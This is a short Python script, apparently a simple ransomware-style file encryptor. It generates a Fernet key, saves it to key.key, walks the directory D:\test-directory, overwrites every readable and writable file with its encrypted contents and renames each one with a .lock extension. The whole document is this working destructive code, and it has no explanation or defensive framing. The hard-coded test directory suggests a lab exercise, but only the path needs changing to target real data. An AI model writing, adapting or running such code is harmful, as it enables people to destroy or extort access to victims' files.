from cryptography.fernet import Fernet
import os

def write_key():
    key = Fernet.generate_key()
    with open('key.key', "wb") as key_file:
        key_file.write(key)


def load_key():
    file = open('key.key', 'rb')
    key_ = file.read()
    file.close()
    return key_

write_key()
key = load_key()
algo = Fernet(key)


path = os.path.join("D:\\test-directory")
os.chdir(path)

for root, dirs, files in os.walk('.'):
    for filename in files:
        filepath = os.path.join(root, filename)

        if os.access(filepath, os.R_OK | os.W_OK):
            with open(filepath, 'rb') as f:
                data = f.read()
        else:
            continue
        
        with open(filepath, 'wb') as f:
            f.write(algo.encrypt(data))

        filepath = os.rename(filepath, filepath+".lock")